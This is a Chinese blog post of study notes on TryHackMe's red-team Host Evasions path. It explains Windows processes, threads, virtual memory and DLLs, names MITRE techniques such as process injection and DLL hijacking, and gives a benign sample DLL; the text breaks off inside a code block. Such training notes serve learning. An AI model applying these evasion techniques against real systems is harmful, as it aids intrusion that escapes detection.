<!doctype html>
<html lang="zh"><head>
<title>Try Hack Me - Red Teaming - Recopec 的博客</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<meta name="description" content="这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&gt; WAP -&gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分没学。 全都是 Windows 相关的知识，学起来挺费劲的，对于从来没有接触过 C# 的我来说有点懵逼，特别是 Windows">
<meta property="og:type" content="article">
<meta property="og:title" content="Try Hack Me - Red Teaming">
<meta property="og:url" content="https://blog.irec.moe/thm_rthe.html">
<meta property="og:site_name" content="Recopec 的博客">
<meta property="og:description" content="这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&gt; WAP -&gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分没学。 全都是 Windows 相关的知识，学起来挺费劲的，对于从来没有接触过 C# 的我来说有点懵逼，特别是 Windows">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/66320022b6b57f3c40e135d66de3c1d9.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/49fb3abea645c7c5850ce3c83981fe76.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/2e5b0c2fccd102d477752270054facb2.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/ba04c5ef220c10b3e174bd1ca77959c6.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250822023032418.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/3c36b4470fb04e3bfdbbef0674b79ec2.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250822080345228.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250822080402484.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/1gThGNPenpT-AS-gjr8JCtA.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/ad61ff4aa1d4f649c02348dfa32eb613.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/f92f294a9e599967a0961b4273381be6.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/fd8a98b3cb79cca98a1e0dfd0292ea61.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250826231518499.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250826222554241.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/0d4ba9ba4348b53036cb2127f4968e87.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250827162448859.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/605235aa87c2f39689d0396bb3603967.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/fce906f0e438efa938753430e5d25afe.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250827174454143.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/eb7ac876cd05f51495f9882fa00ef832.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/2428d786ec68d8731dc98b6598211eb9.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250827183247541.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/image-20250827234532455.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/3b8dd4c6a441eb19620bc3bedd536a8b.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/35e16d45ce27145fcdf231fdb8dcb35e.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/efca9438e858f0476a4ffd777c36501a.png">
<meta property="og:image" content="https://blog.irec.moe/thm_rthe/dc8217f5aecbcc08d609c3299756da08.png">
<meta property="article:published_time" content="2025-08-29T16:00:00.000Z">
<meta property="article:modified_time" content="2025-09-20T10:28:45.209Z">
<meta property="article:author" content="Recopec">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="C#">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.irec.moe/thm_rthe/66320022b6b57f3c40e135d66de3c1d9.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1758368662507">

<link rel="stylesheet" href="/css/style.css?v=1758368662507">






<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1758368662507"></script>

 



<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Recopec 的博客" type="application/atom+xml">
</head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Recopec">
            <img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec" alt="Recopec">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>25</div>
        <div><span>标签</span>34</div>
        <div><span>分类</span>6</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:irec.moe" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://space.bilibili.com/8209358"
			target="_blank"
			mdui-tooltip="{content: '哔哩哔哩'}"
			style="
				color: rgb(231, 106, 141);
				background-color: rgba(231, 106, 141, .1);
			"
		>
			<i
				class="nexmoefont icon-bilibili"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://github.com/Recopec/"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://twitter.com/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'Twitter'}"
			style="
				color: rgb(59, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-twitter"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://t.me/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'TG'}"
			style="
				color: rgb(70, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-telegram"
			></i> </a
		>
	</div>
</div>

    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/THM/">THM</a>
          <span class="category-list-count">6</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/学习/">学习</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/无线电/">无线电</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/生活/">生活</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/硬件/">硬件</a>
          <span class="category-list-count">8</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/网络/">网络</a>
          <span class="category-list-count">4</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Active-Directory/" style="font-size: 10px;">Active Directory</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C#</a> <a href="/tags/OpenClash/" style="font-size: 10px;">OpenClash</a> <a href="/tags/OpenVPN/" style="font-size: 10px;">OpenVPN</a> <a href="/tags/OpenWrt/" style="font-size: 10px;">OpenWrt</a> <a href="/tags/PC/" style="font-size: 10px;">PC</a> <a href="/tags/VR/" style="font-size: 10px;">VR</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/WireGuard/" style="font-size: 10px;">WireGuard</a> <a href="/tags/WireShark/" style="font-size: 10px;">WireShark</a> <a href="/tags/%E4%BF%9D%E5%81%A5/" style="font-size: 10px;">保健</a> <a href="/tags/%E5%85%89%E7%8C%AB/" style="font-size: 15px;">光猫</a> <a href="/tags/%E5%8D%87%E5%AD%A6/" style="font-size: 10px;">升学</a> <a href="/tags/%E5%8D%AB%E6%98%9F/" style="font-size: 10px;">卫星</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/" style="font-size: 10px;">无线电</a> <a href="/tags/%E6%9C%BA%E5%9C%BA/" style="font-size: 10px;">机场</a> <a href="/tags/%E6%A0%88/" style="font-size: 10px;">栈</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E7%81%B5%E8%BD%A6/" style="font-size: 10px;">灵车</a> <a href="/tags/%E7%94%B5%E6%B1%A0/" style="font-size: 10px;">电池</a> <a href="/tags/%E7%9F%AD%E6%B3%A2/" style="font-size: 10px;">短波</a> <a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 10px;">硬盘</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 10px;">经验</a> <a href="/tags/%E7%BB%AD%E5%91%BD/" style="font-size: 10px;">续命</a> <a href="/tags/%E7%BD%91%E5%8D%A1/" style="font-size: 10px;">网卡</a> <a href="/tags/%E7%BE%8A%E6%AF%9B/" style="font-size: 10px;">羊毛</a> <a href="/tags/%E7%BE%A4%E6%99%96/" style="font-size: 15px;">群晖</a> <a href="/tags/%E8%80%83%E8%AF%95/" style="font-size: 10px;">考试</a> <a href="/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/" style="font-size: 10px;">银行卡</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(34);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.addEventListener('load', function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  })
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">3</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/thm_openvpn_conf.html">TryHackMe OpenVPN 配置优化指北</a>
          </li>
        
          <li>
            <a href="/android_capture.html">Android 抓包配置 (Charles + Burp)</a>
          </li>
        
          <li>
            <a href="/thm_rthe.html">Try Hack Me - Red Teaming</a>
          </li>
        
          <li>
            <a href="/thm_ad.html">Try Hack Me - Active Directory</a>
          </li>
        
          <li>
            <a href="/thm_wap.html">Try Hack Me - Web Application Pentesting</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
   
    <div class="nexmoe-copyright">
        &copy; 2025 Recopec
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="/thm_rthe/cover.jpg" alt="Try Hack Me - Red Teaming" loading="lazy">
            <h1>Try Hack Me - Red Teaming</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年08月30日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/THM/">THM</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约50.9k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要201分钟</a>

    </div>
    
    
    
    
    
</div>

    <p>这是 TryHackMe Red Teaming Path 的 Host Evasions 部分，因为我是从 JR -&gt; WAP -&gt; Offensive Pentesting 这样学过来的，所以前面的很多房间学完了，AD 也在 OP 里面学完了，所以就这一部分没学。</p>
<p>全都是 Windows 相关的知识，学起来挺费劲的，对于从来没有接触过 C# 的我来说有点懵逼，特别是 Windows 那些非托管代码的用法一个都不知道，从来没有接触过 Windows 开发，不过还好，房间讲的很细，同时也要靠自己的主观性去搜不懂的有疑问的知识点，网上资源很多。我学习的过程中并不是仅限于房间内的资源，还会拓展很多的。</p>
<p>还是和 Offensive Pentesting 一样，建议这篇文章作为官方 WP 的补充来阅读。</p>
<h1>Windows Internals</h1>
<p>这个房间主要介绍了有关进程，可执行文件相关的东西，大体是让我们掌握这些的概念，不至于懵懵懂懂，相对来说还是挺好理解的。</p>
<h2 id="Process">Process</h2>
<p>一个应用程序包含多个进程，一个进程又由多个组件组成。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads">文档</a>把这些组件分解为每个进程提供执行程序所需要的资源。</p>
<p>进程是通过执行应用程序创建的，Windows 的大部分功能都可以视为一个应用程序，拥有相应的进程。攻击者可以利用这些合法的进程进行攻击，以逃避检测。以下是一些进程攻击方法：</p>
<ul>
<li>Process Injection（进程注入） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/">T1055</a>)</li>
<li>Process Hollowing（进程镂空） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/012/">T1055.012</a>)</li>
<li>Process Masquerading（进程伪装） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/013/">T1055.013</a>)</li>
</ul>
<p>一个进程具有虚拟地址空间、可执行代码、打开系统对象的句柄、安全上下文、唯一的进程标识符、环境变量、优先级类、最小和最大工作集大小，以及至少一个执行线程。</p>
<table>
<thead>
<tr>
<th>进程组件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>私有虚拟内存空间</td>
<td>分配给进程的虚拟内存地址</td>
</tr>
<tr>
<td>可执行程序</td>
<td>定义存储在虚拟内存空间中的代码和数据</td>
</tr>
<tr>
<td>打开的句柄</td>
<td>定义进程可访问的系统资源的句柄</td>
</tr>
<tr>
<td>安全上下文</td>
<td>访问令牌定义了用户， 安全组，权限和其他安全信息</td>
</tr>
<tr>
<td>进程 ID</td>
<td>每个进程独有的数字标识符</td>
</tr>
<tr>
<td>线程</td>
<td>进程计划执行的部分</td>
</tr>
</tbody>
</table>
<p>我们也可以在较低的层面上解释一个进程，因为它驻留在虚拟地址空间中。下表和图表描述了进程在内存中的样子。</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>代码</td>
<td>将要被进程执行的代码</td>
</tr>
<tr>
<td>全局变量</td>
<td>存储的变量</td>
</tr>
<tr>
<td>进程堆</td>
<td>定义存储数据的堆</td>
</tr>
<tr>
<td>进程资源</td>
<td>定义进程未来的资源</td>
</tr>
<tr>
<td>环境块</td>
<td>定义线程信息的数据结构</td>
</tr>
</tbody>
</table>
<img src="/thm_rthe/66320022b6b57f3c40e135d66de3c1d9.png" class="" title="img">
<p>这些信息说实话有点抽象了，但是我们能用任务管理器观察到他们实际的存在。这些数据是用户和攻击者最常操纵的内容。</p>
<table>
<thead>
<tr>
<th>**Value/Component **</th>
<th>**Purpose **</th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>名称</td>
<td>定义进程的名字，一般是进程 exe 的 名字</td>
<td>conhost.exe</td>
</tr>
<tr>
<td>PID</td>
<td>每个进程独有的数字标识符</td>
<td>7408</td>
</tr>
<tr>
<td>状态</td>
<td>进程的运行状态（运行中，暂停等）</td>
<td>Running</td>
</tr>
<tr>
<td>用户名</td>
<td>启动进程的用户，代表进程拥有的权限</td>
<td>SYSTEM</td>
</tr>
</tbody>
</table>
<p>这里的问题就问了一些进程的 PID 相关，还有一个进程的完整性级别，之前做 Windows AD 里面碰到过。</p>
<h2 id="Threads">Threads</h2>
<p>线程是进程的一个可执行单元，线程与其父进程共享相同的详细信息和资源，例如代码、全局变量等。线程也有其独特的数值和数据，如下表所示。</p>
<table>
<thead>
<tr>
<th><strong>Component</strong></th>
<th><strong>Purpose</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>栈</td>
<td>线程相关的所有数据（异常，过程调用等）</td>
</tr>
<tr>
<td>线程局部存储</td>
<td>分配独立数据环境的储存空间的指针</td>
</tr>
<tr>
<td>栈参数</td>
<td>每个线程分配的独立的值</td>
</tr>
<tr>
<td>上下文结构</td>
<td>保存内核维护的机器寄存器的值</td>
</tr>
</tbody>
</table>
<p>题目这里说实话把我绕住了，首先第一问问的是 notepad.exe <strong>创建时</strong>，操作系统为它<strong>自动生成的第一个线程的唯一 ID</strong> 是什么。第二问是前一个线程的栈参数是什么，其实答案是是哪个线程 ID 创建了接下来的 notepad.exe。</p>
<h2 id="Virtual-memory">Virtual memory</h2>
<p>虚拟内存为每个进程提供一个<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/memory/virtual-address-space">私有虚拟内存空间</a>。内存管理器用来将虚拟内存地址映射到物理地址的。拥有虚拟内存空间可以不直接写入物理内存，这样进程就减小碰撞风险了。内存管理器使用的是<strong>页</strong>来传输内存。所以应用程序用的虚拟内存可能会多于实际的物理内存。同时还会将页面虚拟内存移到磁盘（SWAP），以解决内存不够用的问题，提升系统效率，下图是示例。</p>
<img src="/thm_rthe/49fb3abea645c7c5850ce3c83981fe76.png" class="" title="img">
<p>32 位系统理论虚拟地址空间极限是 4GB。这个地址空间被一分为二，下半部分（<em>0x00000000 - 0x7FFFFFFF</em>）所述分配给进程。上半部分（<em>0x80000000 - 0xFFFFFFFF</em>）分配给操作系统内存使用。管理员可以设置 (<em>increaseUserVA</em>) 或者 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/memory/address-windowing-extensions">AWE (<strong>A</strong>ddress <strong>W</strong>indowing <strong>E</strong>xtensions)</a> 来解决需要更大地址空间的应用程序。64 位系统的理论极限是 256TB。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png" alt="img" data-caption="img" loading="lazy"></p>
<p>可以看看 Windows XP，还有 Windows Server 2003 那些开启 4G 内存支持的文章。小时候自己也折腾过，开了一个 PAE，然后把没用到的内存开一个虚拟磁盘，然后在那个虚拟盘上开一个 SWAP。</p>
<h2 id="Dynamic-Link-Libraries">Dynamic Link Libraries</h2>
<p>这一节就是讲动态链接库了，和后面的几个房间都相关。</p>
<p>官方文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library">What is a DLL</a></p>
<p>DLL 在我看来和 JavaScript Python 那些包的概念类似，它们实现了代码重用和模块化。不过 DLL 是编译好的，当然语言类型不同这些也应该不一样。</p>
<p>DLL 作为一个程序中所要用到的函数被加载，因为这个程序依赖 DLL，攻击者就可以针对 DLL 而不是应用程序本身来攻击，相当于把这个方法劫持了，以下是 MTIRE 攻击向量：</p>
<ul>
<li>DLL Hijacking（DLL 劫持） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/001/">T1574.001</a>)</li>
<li>DLL Side-Loading（DLL 侧载） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/002/">T1574.002</a>)</li>
<li>DLL Injection（DLL 注入） (<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/001/">T1055.001</a>)</li>
</ul>
<p>新版 QQ 使用 betterqqnt 那种方法我觉得应该是 DLL 劫持，因为他把恶意的 <code>dbghelp.dll</code> 文件丢到那个目录下，然后程序默认就会运行并且执行这个 DLL 里面的方法（我猜的）。</p>
<p>DLL 的创建与任何其他项目/应用程序并无不同；它们只需要稍作语法修改即可工作。下面是来自 <em>Visual C++ Win32 动态链接库项目</em> 的一个 DLL 示例。</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;stdafx.h&quot;</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">EXPORTING_DLL</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;sampleDLL.h&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这个函数是每个 DLL 文件必须包含的入口点函数，他是由 Windows 操作系统自动调用</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// hModule (DLL 的句柄)：操作系统告诉 DLL “这就是你自己的身份令牌”。DLL 可以用这个令牌来找到自己的位置，或者在需要时加载自己内部的资源。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// ul_reason_for_call (被调用的原因)：操作系统告诉 DLL “我找你是因为一个新进程加载了你”，或者“一个线程正在退出，所以你需要做一些清理工作”。DLL 可以根据这个参数来决定它应该执行什么代码。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// lpReserved (保留参数)：操作系统告诉 DLL “这个参数暂时不用，但将来可能会用，请不要动它”。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// DWORD = unsigned long</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">//</span></span>
<span class="line"><span style="color: #ABB2BF">BOOL APIENTRY </span><span style="color: #61AFEF">DllMain</span><span style="color: #ABB2BF">( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved</span></span>
<span class="line"><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这段代码中 DLLMain 没有执行任何参数，只是返回 TRUE，意味着他在 DLL 加载和卸载的时候不做任何初始化和清理工作</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> TRUE;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HelloWorld</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">MessageBox</span><span style="color: #ABB2BF">( </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">TEXT</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Hello World&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #61AFEF">TEXT</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;In a DLL&quot;</span><span style="color: #ABB2BF">), MB_OK);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h3 id="DWORD-ul-reason-for-call">DWORD ul_reason_for_call</h3>
<ul>
<li><code>1</code> (或 <code>DLL_PROCESS_ATTACH</code>)：DLL 刚刚被一个新进程加载。</li>
<li><code>2</code> (或 <code>DLL_THREAD_ATTACH</code>)：DLL 所在的进程里创建了一个新线程。</li>
<li><code>3</code> (或 <code>DLL_THREAD_DETACH</code>)：DLL 所在的进程里有一个线程退出了。</li>
<li><code>0</code> (或 <code>DLL_PROCESS_DETACH</code>)：DLL 即将被进程卸载。</li>
</ul>
<p>下面是该 DLL 的头文件，通常会保存在一个名为 <code>sampleDLL.h</code> 的头文件中，并被其他源代码文件引用。它将定义导入和导出的函数。</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#ifndef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">INDLL_H</span></span>
